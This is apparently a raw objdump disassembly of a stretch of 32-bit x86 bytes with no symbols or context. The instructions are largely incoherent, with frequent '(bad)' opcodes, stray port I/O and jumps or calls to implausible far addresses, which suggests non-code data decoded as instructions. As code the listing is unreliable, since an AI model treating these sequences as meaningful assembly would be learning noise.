  42059d:	inc    esp
	...
  4205ba:	add    BYTE PTR [eax],al
  4205bc:	sahf   
  4205bd:	inc    eax
  4205be:	out    0xeb,eax
  4205c0:	sub    al,0xe7
  4205c2:	out    0x3,eax
  4205c4:	mov    WORD PTR [ebp+0x63],fs
  4205c7:	add    al,0x84
  4205c9:	inc    ebp
  4205ca:	out    dx,eax
  4205cb:	add    BYTE PTR ds:0xea8152e8,bh
  4205d1:	sti    
  4205d2:	pop    edi
  4205d3:	inc    edi
  4205d4:	jmp    0xcd76fac0
  4205d9:	inc    eax
  4205da:	sub    cl,BYTE PTR [ebp+0x472de86f]
  4205e0:	mov    cl,0x98
  4205e2:	sub    eax,0xb37fc001
  4205e7:	(bad)  
  4205e8:	mov    ecx,0xaae7a387
  4205ed:	xor    BYTE PTR [edx],al
  4205ef:	add    ecx,DWORD PTR ds:0x3703e2be
  4205f5:	push   0x3f1e338f
  4205fa:	out    0xeb,eax
  4205fc:	test   al,0xe6
  4205fe:	jmp    edi
  420600:	push   cs
  420601:	mov    DWORD PTR [edx-0x23],esi
  420604:	cmp    ebp,edi
  420606:	xchg   BYTE PTR [ebp+ecx*1+0x55],ah
  42060a:	push   ebp
  42060b:	ss aam 0x54
  42060e:	push   ebp
  42060f:	rol    DWORD PTR fs:[edi+0x7cb624f],cl
  420616:	std    
  420617:	stc    
  420618:	adc    WORD PTR [ebp-0x18],di
  42061c:	push   cs
  42061d:	add    DWORD PTR [edx-0x33],0x0
	...
  42063d:	add    BYTE PTR [ecx+0x31aefc46],dl
  420643:	adc    eax,0xc0cea931
  420648:	mov    BYTE PTR [ecx+eiz*1],al
  42064b:	imul   ebx,DWORD PTR [eax-0x1bc169cf],0xfcfbd36a
  420655:	mov    edx,0xed72890d
  42065a:	rol    esp,1
  42065c:	or     al,0x6c
  42065e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42065f:	cli    
  420660:	cld    
  420661:	jmp    0x6d4efba7
  420666:	pushf  
  420667:	cli    
  420668:	cld    
  420669:	jmp    0xbf973ece
  42066e:	or     eax,0x4ef7500f
  420673:	add    BYTE PTR [ecx-0x769df5d3],al
  420679:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42067a:	xchg   BYTE PTR [edi+eax*4-0x11],ah
  42067e:	xor    al,0x89
  420680:	inc    edx
  420681:	pop    ebp
  420682:	xor    al,0x83
  420684:	inc    ebp
  420685:	jmp    0x4206ab
  420687:	mov    DWORD PTR [edx+0x79],eax
  42068a:	and    al,0x83
  42068c:	inc    ebp
  42068d:	in     eax,dx
  42068e:	xor    al,0x89
  420690:	inc    edx
  420691:	jne    0x4206c7
  420693:	add    DWORD PTR [ebp+0x0],0xffffffaa
  420697:	mov    eax,DWORD PTR [ecx-0x64]
  42069a:	sbb    eax,0xb98b0849
  42069f:	sahf   
  4206a0:	test   DWORD PTR [esi+0x0],eax
	...
  4206bf:	add    BYTE PTR [ebx+ecx*4+0x41],ah
  4206c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206c4:	std    
  4206c5:	inc    ecx
  4206c6:	adc    al,0x8b
  4206c8:	sub    DWORD PTR [ebp+eax*4+0x41855c46],ebp
  4206cf:	lods   al,BYTE PTR ds:[esi]
  4206d0:	in     eax,dx
  4206d1:	inc    ecx
  4206d2:	sbb    al,0x66
  4206d4:	fisttp WORD PTR [eax-0x50]
  4206d7:	data16 fld QWORD PTR [ecx+0x20]
  4206db:	scas   ax,WORD PTR es:[edi]
  4206dd:	dec    eax
  4206de:	mov    ah,0x66
  4206e0:	lods   eax,DWORD PTR ds:[esi]
  4206e1:	inc    ecx
  4206e2:	and    ah,BYTE PTR [esi-0x41]
  4206e5:	dec    eax
  4206e6:	mov    eax,0x2441bd66
  4206eb:	scas   ax,WORD PTR es:[edi]
  4206ed:	dec    eax
  4206ee:	mov    esp,0x2641ad66
  4206f3:	data16 lahf 
  4206f5:	dec    eax
  4206f6:	shl    BYTE PTR [esi-0x63],0x41
  4206fa:	sub    BYTE PTR [ebx+0x4685c839],cl
  420700:	rol    BYTE PTR [esi-0x3ed067bf],0x70
  420707:	packuswb mm0,mm2
  42070a:	sub    al,0x56
  42070c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42070d:	(bad)  
  42070e:	in     al,0x10
  420710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420711:	cli    
  420712:	adc    DWORD PTR [esi*4+0x2433003d],eax
  420719:	in     al,dx
  42071a:	cmp    eax,0xc1fdb5ea
  42071f:	or     BYTE PTR [edi+eiz*2+0x680c],dh
	...
  420742:	les    edi,FWORD PTR [eax+0x3f]
  420745:	add    BYTE PTR [ecx+esi*8],bl
  420748:	in     eax,0x1
  42074a:	or     eax,0xa16281e7
  42074f:	out    0x66,eax
  420751:	add    BYTE PTR [esi-0x2202f754],al
  420757:	push   cs
  420758:	cmp    eax,0x8be70c8c
  42075d:	inc    edx
  42075e:	imul   edi,esi,0x274d310d
  420764:	ror    DWORD PTR [eax+0x42c5cee8],0x71
  42076b:	outs   dx,DWORD PTR ds:[esi]
  42076c:	(bad)  
  42076d:	cld    
  42076e:	bound  esp,QWORD PTR [esi+0x50]
  420771:	cld    
  420772:	pop    edx
  420773:	outs   dx,BYTE PTR ds:[esi]
  420774:	dec    eax
  420775:	in     al,0x65
  420777:	out    0xe6,al
  420779:	dec    BYTE PTR [edx-0x5b]
  42077c:	add    al,0x0
  42077e:	mov    bh,0xda
  420780:	push   0x425c010
  420785:	call   0x4597fe
  42078a:	mov    cs,WORD PTR [eax+eax*1]
  42078d:	add    BYTE PTR [esi-0x2202f3dc],dl
  420793:	mov    ss,WORD PTR [ecx]
  420795:	test   BYTE PTR [edi+eiz*8],cl
  420798:	mov    eax,DWORD PTR [edx-0xf]
  42079b:	jge    0x4207a7
  42079d:	xor    ebp,ecx
  42079f:	ror    DWORD PTR es:[eax+0x42c64f70],0x0
	...
  4207c3:	add    cl,ch
  4207c5:	jle    0x4207c4
  4207c7:	cld    
  4207c8:	jmp    0x485d:0xe2fc5065
  4207cf:	in     al,0xe5
  4207d1:	sub    esp,ebp
  4207d3:	(bad)  
  4207d4:	shl    BYTE PTR [eax*1+0x68e33700],cl
  4207db:	add    BYTE PTR [eax],bh
  4207dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4207de:	add    al,ch
  4207e0:	cmp    BYTE PTR [eax],al
  4207e2:	adc    BYTE PTR [ecx*1-0x55007c83],al
  4207e9:	stc    
  4207ea:	fwait
  4207eb:	adc    esp,DWORD PTR [eax+0x4f8adb72]
  4207f1:	or     BYTE PTR [esi],al
  4207f3:	xor    esp,DWORD PTR [ebp+0xd04683e]
  4207f9:	and    DWORD PTR [esi],0x7b
  4207fc:	adc    al,0x85
  4207fe:	fwait
  4207ff:	pop    ss
  420800:	xchg   edx,eax
  420801:	(bad)  
  420802:	imul   esp,DWORD PTR [edi+0x69],0x9211d1ff
  420809:	inc    edx
  42080a:	retf   
  42080b:	jmp    0x44e93520
  420810:	dec    esp
  420811:	test   BYTE PTR [ebx-0x14],cl
  420814:	dec    ecx
  420815:	inc    edx
  420816:	ret    
  420817:	pushf  
  420818:	dec    ecx
  420819:	clc    
  42081a:	mov    ch,0x81
  42081c:	xlat   BYTE PTR ds:[ebx]
  42081d:	sti    
  42081e:	lods   eax,DWORD PTR ds:[esi]
  42081f:	mov    edi,ecx
  420821:	jecxz  0x4207b1
  420823:	jbe    0x42084f
  420825:	(bad)  
  420826:	out    0xc1,al
	...
  420844:	add    BYTE PTR [eax],al
  420846:	sbb    al,BYTE PTR [eax]
  420848:	cmp    al,0x89
  42084a:	ss jl  0x4208c7
  42084d:	xor    al,0x87
  42084f:	pop    es
  420850:	addr16 ret 
  420852:	loop   0x4207db
  420854:	sub    esi,esp
  420856:	xchg   esp,eax
  420857:	dec    eax
  420858:	jmp    0xe582c069
  42085d:	push   esp
  42085e:	mov    ds:0x478bee6a,al
  420863:	icebp  
  420864:	mov    edi,0x1f8ae3f4
  420869:	push   0x8
  42086b:	test   ebx,ecx
  42086d:	shl    eax,cl
  42086f:	jmp    0x8c214fe2
  420874:	mov    ds:0x3d920b,eax
  420879:	cmp    dl,BYTE PTR [edx-0x2660fbe]
  42087f:	mov    edi,0xf6ef5de7
  420884:	cld    
  420885:	rol    DWORD PTR gs:[esp+eax*4],1
  420889:	push   cs
  42088a:	or     DWORD PTR [eax],eax
  42088c:	add    BYTE PTR [edx+edx*2-0x30],bl
  420890:	push   eax
  420891:	mov    ebx,0x1427eb5
  420896:	push   eax
  420897:	inc    edx
  420898:	lock (bad) [esi]
  42089b:	add    BYTE PTR [eax],al
  42089d:	(bad)
  4208a2:	test   BYTE PTR [edi-0x3ed2e41],bh
  4208a8:	outs   dx,BYTE PTR ds:[esi]
  4208a9:	imul   eax,DWORD PTR [eax],0x0
	...
  4208c7:	add    BYTE PTR [edi+0x4],ch
  4208ca:	mov    BYTE PTR [eax+ebx*2],ah
  4208cd:	ja     0x42088e
  4208cf:	dec    eax
  4208d0:	pop    ds
  4208d1:	sar    BYTE PTR [edi+0x3c],0x48
  4208d5:	jns    0x42094d
  4208d7:	(bad)  [esi+0x977fd42]
  4208dd:	scas   al,BYTE PTR es:[edi]
  4208de:	mov    esi,0x5d09a480
  4208e3:	xchg   esi,eax
  4208e4:	sub    DWORD PTR [edx-0x51ee26bf],ecx
  4208ea:	ror    BYTE PTR [edi-0x44f480b3],1
  4208f0:	test   BYTE PTR [edx-0x3],dl
  4208f3:	out    dx,al
  4208f4:	rol    bh,0xfd
  4208f7:	stos   BYTE PTR es:[edi],al
  4208f8:	xchg   esi,eax
  4208f9:	adc    ch,BYTE PTR [edi]
  4208fb:	gs into 
  4208fd:	jb     0x420907
  4208ff:	idiv   BYTE PTR [eax+0x1fe587c7]
  420905:	test   al,0x56
  420908:	dec    ebx
  420909:	clc    
  42090a:	cld    
  42090b:	pushf  
  42090c:	fidiv  WORD PTR [ecx-0x54]
  42090f:	add    bl,bl
  420911:	lods   al,BYTE PTR ds:[esi]
  420912:	mov    edi,0x2e32b0c6
  420917:	mov    esi,DWORD PTR [ecx+0xa]
  42091a:	push   0x6
  42091c:	mov    bh,0xd0
  42091e:	pop    ebx
  42091f:	not    DWORD PTR [ebx]
  420921:	cmc    
  420922:	mov    edi,0xffc8420f
  420927:	int    0x31
  420929:	shl    DWORD PTR [ecx+0xb],1
	...
  420948:	add    BYTE PTR [eax],al
  42094a:	repz add DWORD PTR [edx+0x75],esi
  42094e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42094f:	add    al,BYTE PTR [eax+0x4ee776c3]
  420955:	mov    esi,DWORD PTR [ecx-0x48fa95f6]
  42095b:	rcr    BYTE PTR [ebx-0x9],1
  42095e:	push   ebx
  42095f:	or     dh,0x75
  420962:	pop    esp
  420963:	sar    ebp,0x61
  420966:	int    0x75
  420968:	add    bl,ch
  42096a:	std    
  42096b:	xchg   BYTE PTR [ecx+0x8],al
  42096e:	jl     0x42096e
  420970:	jo     0x42097d
  420972:	jae    0x420970
  420974:	outs   dx,BYTE PTR fs:[esi]
  420976:	shr    BYTE PTR [edx-0x80],cl
  420979:	ret    
  42097a:	xor    ch,ah
  42097c:	es push 0x27
  42097f:	sub    eax,0xf2835fd2
  420984:	adc    edx,0x1c30401
  42098a:	sbb    ebp,DWORD PTR [ebx+eiz*2+0x0]
  42098e:	jg     0x42099f
  420990:	test   BYTE PTR [ebp-0x4],0xfc
  420994:	jo     0x42099e
  420996:	mov    bl,0xfb
  420998:	ins    DWORD PTR es:[edi],dx
  420999:	add    BYTE PTR gs:[edx],al
  42099c:	out    0x6,eax
  42099e:	and    edi,ebx
  4209a0:	pop    esi
  4209a1:	outs   dx,DWORD PTR ds:[esi]
  4209a2:	fld    DWORD PTR [ecx]
  4209a4:	add    bl,0xd
  4209a7:	jmp    0x3000:0x1dceb609
	...
  4209ca:	add    BYTE PTR [eax],al
  4209cc:	or     eax,0x6a58c571
  4209d1:	xor    dh,al
  4209d3:	add    ecx,DWORD PTR ds:0x8eeb8d94
  4209d9:	xor    edx,DWORD PTR [esi+edx*2+0x5a]
  4209dd:	ins    BYTE PTR es:[edi],dx
  4209de:	aas    
  4209df:	call   0x348c1921
  4209e4:	or     al,0xe7
  4209e6:	jl     0x4209a7
  4209e8:	and    edx,esp
  4209ea:	mov    eax,0xe70ad8
  4209ef:	inc    sp
  4209f1:	pushf  
  4209f2:	call   0x3f9e2167
  4209f7:	call   0xc051efd9
  4209fc:	pop    ds
  4209fd:	daa    
  4209fe:	add    al,0xe8
  420a00:	ret    0x452
  420a03:	add    BYTE PTR [esi-0x7a0003bc],cl
  420a09:	sbb    al,0xf8
  420a0b:	mov    esp,0xe431
  420a10:	mov    ?,WORD PTR [esp+ecx*1]
  420a13:	add    dl,bl
  420a15:	xor    ecx,DWORD PTR [edi*8+0x40163b20]
  420a1c:	or     eax,0xa0fd1092
  420a21:	out    dx,al
  420a22:	stc    
  420a23:	adc    al,BYTE PTR [ecx]
  420a25:	cli    
  420a26:	inc    eax
  420a27:	add    al,bl
  420a29:	call   0xf44f0a31
  420a2e:	mov    DWORD PTR ss:[eax],eax
	...
  420a4d:	add    BYTE PTR [eax+0x73],dl
  420a50:	ss rol ah,cl
  420a53:	jle    0x420a5a
  420a55:	add    BYTE PTR ds:0x488af46e,cl
  420a5b:	add    BYTE PTR [edi-0x78],cl
  420a5e:	pop    edi
  420a5f:	mov    al,0xb8
  420a61:	jmp    0x420aa3
  420a63:	not    BYTE PTR [ebp-0x6]
  420a66:	fnstcw WORD PTR [edx]
  420a68:	dec    ebx
  420a69:	jg     0x4209fd
  420a6b:	imul   esp,esi,0xffffff8e
  420a6e:	pop    edi
  420a6f:	add    al,0x72
  420a71:	leave  
  420a72:	stos   BYTE PTR es:[edi],al
  420a73:	loopne 0x420ad4
  420a75:	cli    
  420a76:	mov    ecx,0x39033e80
  420a7b:	sbb    BYTE PTR [edi+0x1e04214b],ch
  420a81:	inc    eax
  420a82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a83:	jle    0x420a18
  420a85:	sti    
  420a86:	mov    dl,0x0
  420a88:	out    0x3,eax
  420a8a:	pop    ds
  420a8b:	mov    eax,ds:0x55e9c3b8
  420a90:	xor    ch,al
  420a92:	or     al,BYTE PTR [eax]
  420a94:	aaa    
  420a95:	add    al,0x64
  420a97:	in     eax,dx
  420a98:	xchg   ebx,eax
  420a99:	mov    fs,WORD PTR [esi-0x80]
  420a9c:	rcl    BYTE PTR [esp+edi*4],cl
  420a9f:	dec    ebp
  420aa0:	jb     0x420ad1
  420aa2:	add    eax,0x1c042710
  420aa7:	fnstcw WORD PTR [ecx]
  420aa9:	xchg   edi,ecx
  420aab:	not    DWORD PTR [esi]
  420aad:	push   ebp
  420aae:	mov    bh,0xfb
  420ab0:	sbb    DWORD PTR [ebp+0x0],edx
	...
  420acf:	add    ah,bl
  420ad1:	hlt    
  420ad2:	cmp    ecx,DWORD PTR [eax*4+0x326cae52]
  420ad9:	hlt    
  420ada:	out    0x83,al
  420adc:	sub    ebp,ecx
  420ade:	arpl   sp,ax
  420ae0:	lahf   
  420ae1:	push   eax
  420ae2:	ds (bad) 
  420ae4:	xlat   BYTE PTR ds:[ebx]
  420ae5:	adc    esi,edi
  420ae7:	inc    ebx
  420ae8:	or     eax,0x770c2387
  420aed:	cld    
  420aee:	jge    0x420b5f
  420af0:	adc    DWORD PTR [esi+0x0],esp
  420af3:	in     eax,dx
  420af4:	push   0x448157fa
  420af9:	je     0x420afb
  420afb:	jmp    0xba324993
  420b00:	mov    edi,DWORD PTR [esi]
  420b02:	hlt    
  420b03:	mov    ecx,0xba016641
  420b08:	cmp    DWORD PTR [ecx-0x3],edx
  420b0b:	mov    esp,0x4172f512
  420b10:	(bad)  
  420b11:	int    0x82
  420b13:	sub    DWORD PTR [edx],ebp
  420b15:	or     ebp,edi
  420b17:	mov    ah,0xa2
  420b19:	hlt    
  420b1a:	aam    0x6a
  420b1c:	and    dh,al
  420b1e:	(bad)  
  420b1f:	xchg   esp,eax
  420b20:	adc    ebp,esi
  420b22:	inc    edx
  420b23:	loope  0x420ab6
  420b25:	jbe    0x420b2f
  420b27:	test   DWORD PTR [eax],ebx
  420b29:	shr    eax,0xed
  420b2c:	dec    esp
  420b2d:	ds std 
  420b2f:	call   0xf73a79b9
	...
  420b50:	add    BYTE PTR [eax],al
  420b52:	pop    ebp
  420b53:	push   esp
  420b54:	mov    ah,BYTE PTR [ebp+esi*2+0x50b05955]
  420b5b:	sti    
  420b5c:	push   DWORD PTR [ebx]
  420b5e:	mov    ah,BYTE PTR [edi+0x24]
  420b61:	gs (bad) 
  420b63:	out    0xcf,eax
  420b65:	jmp    0x420b75
  420b67:	add    BYTE PTR [ecx+0x1f],dl
  420b6a:	fdiv   QWORD PTR [eax]
  420b6c:	shr    BYTE PTR [ebx+ecx*4-0x61],0xfa
  420b71:	mov    dh,0x35
  420b73:	inc    edx
  420b74:	push   eax
  420b75:	sbb    DWORD PTR [ebx+0x49db501b],esp
  420b7b:	hlt    
  420b7c:	adc    al,BYTE PTR [ecx-0x8]
  420b7f:	aas    
  420b80:	add    BYTE PTR [esi+ecx*2+0x6e],ch
  420b84:	jno    0x420be8
  420b86:	jecxz  0x420b2b
  420b88:	adc    BYTE PTR [eax],al
  420b8a:	xor    al,0xfc
  420b8c:	mov    BYTE PTR [ebp-0x415b8],al
  420b92:	adc    al,0xf9
  420b94:	ror    BYTE PTR [ebx+0x400cfaa1],cl
  420b9a:	hlt    
  420b9b:	jecxz  0x420bc0
  420b9d:	lea    ebp,[ecx-0x6d]
  420ba0:	stc    
  420ba1:	inc    DWORD PTR [ebx+0x4f]
  420ba4:	sti    
  420ba5:	adc    eax,0x400b8c
  420baa:	inc    ecx
  420bab:	jb     0x420b4e
  420bad:	std    
  420bae:	add    edi,eax
  420bb0:	dec    esp
  420bb1:	(bad)  
  420bb2:	fnstenv [edx+0x400f]
	...
  420bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bd5:	jno    0x420b94
  420bd7:	je     0x420b8b
  420bd9:	jns    0x420b5c
  420bdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bdc:	add    eax,edi
  420bde:	sti    
  420bdf:	push   eax
  420be0:	add    edx,ecx
  420be2:	xor    WORD PTR fs:[edx],si
  420be6:	lods   al,BYTE PTR ds:[esi]
  420be7:	push   eax
  420be8:	add    DWORD PTR [edx-0x5f],esi
  420beb:	std    
  420bec:	sub    edx,0x4c
  420bef:	call   FWORD PTR [ebx]
  420bf1:	jb     0x420bb0
  420bf3:	je     0x420c1f
  420bf5:	popa   
  420bf6:	jg     0x420c75
  420bf8:	mov    ah,0x76
  420bfa:	jno    0x420c17
  420bfc:	inc    ebx
  420bfd:	jo     0x420c7b
  420bff:	xor    esp,DWORD PTR [ecx+edx*2-0x78cfba7b]
  420c06:	inc    ecx
  420c07:	shl    BYTE PTR [ebx+ebp*8],0x11
  420c0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c0c:	pop    edx
  420c0d:	add    BYTE PTR ds:[ebp-0x4cfb8f9c],al
  420c14:	and    eax,0x246a06e5
  420c19:	jmp    0xa6be888f
  420c1e:	out    dx,eax
  420c1f:	add    BYTE PTR ds:0x875e55e9,cl
  420c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c26:	pop    eax
  420c27:	adc    eax,0x9c1cbf3
  420c2d:	out    0x4f,eax
  420c2f:	mov    ecx,ebp
  420c31:	push   0xe70c1be8
  420c36:	add    BYTE PTR [ecx+0x0],dl
	...
  420c55:	add    BYTE PTR [ebx-0x4e],al
  420c58:	data16 adc dl,ah
  420c5b:	int3   
  420c5c:	or     BYTE PTR [ecx-0xfb8a34c],cl
  420c62:	cmp    al,0x3f
  420c64:	retf   0xdf1
  420c67:	out    0x33,eax
  420c69:	inc    ebx
  420c6a:	mov    ebp,0xc14333b9
  420c6f:	sub    ah,ch
  420c71:	(bad)  
  420c73:	clc    
  420c74:	aas    
  420c75:	neg    dh
  420c77:	sbb    DWORD PTR [ecx],esi
  420c79:	(bad)  
  420c7a:	fisub  WORD PTR [esi]
  420c7c:	mov    dl,BYTE PTR [ebx+0x10]
  420c7f:	(bad)  [eax]
  420c81:	push   esp
  420c82:	add    BYTE PTR [edi],cl
  420c84:	inc    esp
  420c85:	add    DWORD PTR [ebp+0x4a4405e3],0x5f681a8
  420c8f:	jne    0x420c7b
  420c91:	ss lock (bad) 
  420c94:	ins    BYTE PTR es:[edi],dx
  420c95:	and    ebp,DWORD PTR [edx+0x54]
  420c98:	adc    al,0x8b
  420c9a:	mov    bh,cl
  420c9c:	repnz cld 
  420c9e:	pop    edx
  420c9f:	pusha  
  420ca0:	mov    eax,0xf5c253e7
  420ca5:	out    0xaa,eax
  420ca7:	push   0xd6b7fcf6
  420cac:	push   esi
  420cad:	mov    eax,eax
  420caf:	mov    dh,0x87
  420cb1:	and    BYTE PTR ds:0x35fcf5a1,0x0
  420cb8:	ret    
  420cb9:	test   BYTE PTR [eax],al
	...
  420cd7:	add    BYTE PTR [ecx],ah
  420cd9:	icebp  
  420cda:	in     eax,dx
  420cdb:	lods   eax,DWORD PTR ds:[esi]
  420cdc:	iret   
  420cdd:	or     eax,edx
  420cdf:	mov    esi,0x701f1b9e
  420ce4:	sbb    DWORD PTR [eax-0x4],ecx
  420ce7:	adc    eax,0x43f62bc5
  420cec:	or     eax,0x9eaee66
  420cf1:	mov    eax,0x4d6f22
  420cf6:	sar    ebp,1
  420cf8:	inc    ecx
  420cf9:	push   eax
  420cfa:	jb     0x420cba
  420cfc:	test   esp,ebp
  420cfe:	mov    WORD PTR ds:[ebx+0x2688e6ff],?
  420d05:	jne    0x420cd8
  420d07:	sub    ebx,DWORD PTR [ebx+eax*4-0x5d]
  420d0b:	repz dec edx
  420d0d:	icebp  
  420d0e:	(bad)  [ebx+0x56e74018]
  420d14:	dec    ebx
  420d15:	push   ebp
  420d16:	xor    cl,al
  420d18:	adc    al,BYTE PTR [eax]
  420d1a:	mov    ch,0x8a
  420d1c:	stos   DWORD PTR es:[edi],eax
  420d1d:	out    0xf9,eax
  420d1f:	add    ecx,DWORD PTR ds:0x313f1500
  420d25:	or     al,ch
  420d27:	outs   dx,DWORD PTR ds:[esi]
  420d28:	or     ecx,DWORD PTR [edx+0xf]
  420d2b:	(bad)  [ebx-0x1]
  420d2e:	out    0x8a,al
  420d30:	dec    eax
  420d31:	push   ecx
  420d32:	sub    edi,edi
  420d34:	push   0xffffff85
  420d36:	sub    al,0xc
  420d38:	dec    eax
  420d39:	stc    
  420d3a:	xor    ch,BYTE PTR [ebp+0x0]
	...
  420d59:	add    ch,cl
  420d5b:	jmp    FWORD PTR [ebx-0x3c]
  420d5e:	fiadd  WORD PTR ds:0xf0dd0c62
  420d64:	pop    ss
  420d65:	or     al,0x8c
  420d67:	pop    ecx
  420d68:	out    dx,eax
  420d69:	add    eax,DWORD PTR [ecx+eax*8+0x1472bfff]
  420d70:	(bad)  
  420d71:	call   0x392d9451
  420d76:	mov    esi,0xef1787e
  420d7b:	ins    BYTE PTR es:[edi],dx
  420d7c:	add    al,0x59
  420d7e:	push   cs
  420d7f:	mov    ecx,0xe86a6ac0
  420d84:	call   FWORD PTR [esi]
  420d86:	jno    0x420dc8
  420d88:	adc    eax,0x60581129
  420d8d:	fimul  WORD PTR [esi+0x0]
  420d90:	call   0xfd311321
  420d95:	jb     0x420d70
  420d97:	xor    ch,0xd5
  420d9a:	adc    al,0x79
  420d9c:	add    eax,0xffec326a
  420da1:	pop    ebx
  420da2:	push   edx
  420da3:	in     al,dx
  420da4:	dec    esi
  420da5:	lahf   
  420da6:	mov    ecx,0xd1641c3f
  420dab:	jb     0x420dcf
  420dad:	(bad)  
  420daf:	jmp    0x420d33
  420db1:	sub    DWORD PTR ds:0x8bf18909,ebx
  420db7:	push   edx
  420db8:	clc    
  420db9:	mov    ebx,0xf54eed3e
	...
  420dda:	add    BYTE PTR [eax],al
  420ddc:	adc    ebp,DWORD PTR [edi+0x628de573]
  420de2:	clc    
  420de3:	jmp    0x733e507d
  420de8:	or     DWORD PTR [eax-0x3],edx
  420deb:	cwde   
  420dec:	push   es
  420ded:	jns    0x420df4
  420def:	xchg   edi,eax
  420df0:	popa   
  420df1:	aas    
  420df2:	or     BYTE PTR [edx+0x23],dh
  420df5:	call   0x73907257
  420dfa:	add    esp,DWORD PTR [eax-0x33]
  420dfd:	imul   eax
  420dff:	jb     0x420dfd
  420e01:	mov    edi,0x3e7700c6
  420e06:	xchg   esp,ebp
  420e08:	adc    eax,0xa7083c79
  420e0d:	dec    ebp
  420e0e:	cld    
  420e0f:	add    BYTE PTR [edi+0x685588fa],ch
  420e15:	push   ecx
  420e16:	push   eax
  420e17:	call   ebp
  420e19:	cmp    eax,DWORD PTR [ecx+0x7efff0c0]
  420e1f:	gs cwde 
  420e21:	add    al,BYTE PTR [edi-0x404677bb]
  420e27:	push   esi
  420e28:	sbb    al,0x34
  420e2a:	adc    eax,DWORD PTR [eax-0x1c]
  420e2d:	pop    edx
  420e2e:	push   eax
  420e2f:	pop    ss
  420e30:	xor    al,0x4
  420e32:	call   0x451691
  420e37:	mov    esi,DWORD PTR [esi+ebp*2]
  420e3a:	repz je 0x420dd9
  420e3d:	cmp    edi,ebx
  420e3f:	je     0x420e41
	...
  420e5d:	add    BYTE PTR [eax],dl
  420e5f:	clc    
  420e60:	cli    
  420e61:	adc    eax,0x400f70
  420e66:	aas    
  420e67:	jmp    0x420dea
  420e69:	push   DWORD PTR [eax+0x1d]
  420e6c:	xchg   DWORD PTR [esi],eax
  420e6e:	cmp    DWORD PTR [ebx+edi*8],0x50
  420e72:	aam    0x6d
  420e74:	mov    ebp,0xb303be75
  420e79:	dec    esp
  420e7a:	rcl    BYTE PTR [edx],0x87
  420e7d:	push   es
  420e7e:	lds    edi,FWORD PTR [ebx+edi*8]
  420e81:	push   eax
  420e82:	dec    esp
  420e83:	ins    DWORD PTR es:[edi],dx
  420e84:	mov    ebp,0x70f36e75
  420e89:	and    al,0x50
  420e8b:	ja     0x420e8f
  420e8d:	push   esi
  420e8e:	jnp    0x420ee1
  420e90:	xor    BYTE PTR [ebp-0x74f3974c],al
  420e96:	jb     0x420ee4
  420e98:	add    BYTE PTR [esi+0xd],dl
  420e9b:	(bad)  
  420e9c:	push   ebx
  420e9d:	inc    eax
  420e9e:	nop
  420e9f:	cwde   
  420ea0:	ja     0x420eaa
  420ea2:	xchg   esi,eax
  420ea3:	ficom  WORD PTR [esi-0x3]
  420ea6:	(bad)  
  420ea8:	xor    eax,0x16b5daf6
  420ead:	cmp    al,0xfe
  420eaf:	sbb    BYTE PTR [ecx+ecx*4],al
  420eb2:	dec    ebx
  420eb3:	inc    ebp
  420eb4:	push   edx
  420eb5:	ret    0xd909
  420eb8:	push   edi
  420eb9:	mov    DWORD PTR [ecx],esp
  420ebb:	daa    
  420ebc:	jge    0x420f00
  420ebe:	adc    eax,0xe85935
	...
  420edf:	add    BYTE PTR [ebx-0x7a],ah
  420ee2:	lock cld 
  420ee4:	xchg   BYTE PTR [edi-0x79],ah
  420ee7:	cmc    
  420ee8:	jns    0x420f07
  420eea:	test   DWORD PTR [edx-0x17],esp
  420eed:	xlat   BYTE PTR ds:[ebx]
  420eee:	jge    0x420ef5
  420ef0:	nop
  420ef1:	mov    ah,0xec
  420ef3:	dec    esi
  420ef4:	fcmovbe st,st(4)
  420ef6:	adc    al,0xd
  420ef8:	call   0x543e:0x634f10a4
  420eff:	sub    BYTE PTR [eax-0x71fb87e9],cl
  420f05:	(bad)  
  420f06:	in     al,dx
  420f07:	inc    DWORD PTR [edi+0x3dfd56dd]
  420f0d:	fistp  QWORD PTR [ebp+0x42]
  420f10:	mov    eax,ds:0xcd82f472
  420f15:	xchg   ebx,eax
  420f16:	or     ecx,DWORD PTR [ecx+0x4ff18105]
  420f1c:	mov    ch,BYTE PTR [eax+0x72858950]
  420f22:	or     dl,BYTE PTR [esi+0x7a]
  420f25:	xchg   eax,edi
  420f27:	xor    BYTE PTR [ebp+0x5c],cl
  420f2a:	icebp  
  420f2b:	or     al,0x81
  420f2d:	pop    ss
  420f2e:	fld    QWORD PTR [edi+0x62]
  420f31:	add    BYTE PTR [eax+ebx*1+0x58],bl
  420f35:	jae    0x420f2e
  420f37:	repnz (bad) 
  420f3a:	mov    esi,0xcded4829
  420f3f:	jle    0x420f7b
  420f41:	add    ebp,0x78
	...
  420f60:	add    BYTE PTR [eax],al
  420f62:	adc    DWORD PTR [edx],esi
  420f64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420f65:	fsubrp st(2),st
  420f67:	js     0x420f94
  420f69:	cld    
  420f6a:	mov    ebp,0x21f1b7d7
  420f6f:	in     eax,dx
  420f70:	jno    0x420f65
  420f72:	(bad)  
  420f73:	not    BYTE PTR [ebx]
  420f75:	or     bh,bl
  420f77:	enter  0x1781,0x94
  420f7b:	add    eax,0x50005a36
  420f80:	(bad)  
  420f81:	jle    0x420f65
  420f83:	js     0x420f69
  420f85:	pop    ecx
  420f86:	lock dec edi
  420f88:	fisttp WORD PTR [eax-0x39ad033b]
  420f8e:	xchg   ebp,eax
  420f8f:	add    al,0xbe
  420f91:	repnz dec edx
  420f93:	clc    
  420f94:	jo     0x420f5c
  420f96:	xor    eax,0xccbcb54d
  420f9b:	movntq QWORD PTR [eax-0x6c],mm3
  420f9f:	(bad)  [edi-0x21]
  420fa2:	push   ss
  420fa3:	add    al,0xe7
